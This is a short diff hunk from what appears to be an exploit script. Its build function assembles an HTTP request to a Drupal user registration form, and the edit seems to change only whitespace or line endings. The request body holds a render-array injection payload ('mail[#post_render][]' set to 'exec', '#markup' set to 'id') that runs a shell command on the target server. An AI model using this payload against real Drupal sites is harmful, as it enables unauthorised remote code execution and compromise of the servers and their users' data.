@@ -24,14 +24,14 @@ def build(ip_port: str, cmd: str):
 Host: {ip_port}
 Content-Type: application/x-www-form-urlencoded
 
-"form_id": "user_register_form",
-
-"_drupal_ajax": "1",
-
-"mail[#post_render][]": "exec",
-
-"mail[#type]": "markup",
-
+"form_id": "user_register_form",
+
+"_drupal_ajax": "1",
+
+"mail[#post_render][]": "exec",
+
+"mail[#type]": "markup",
+
 "mail[#markup]": "id"
 """
     
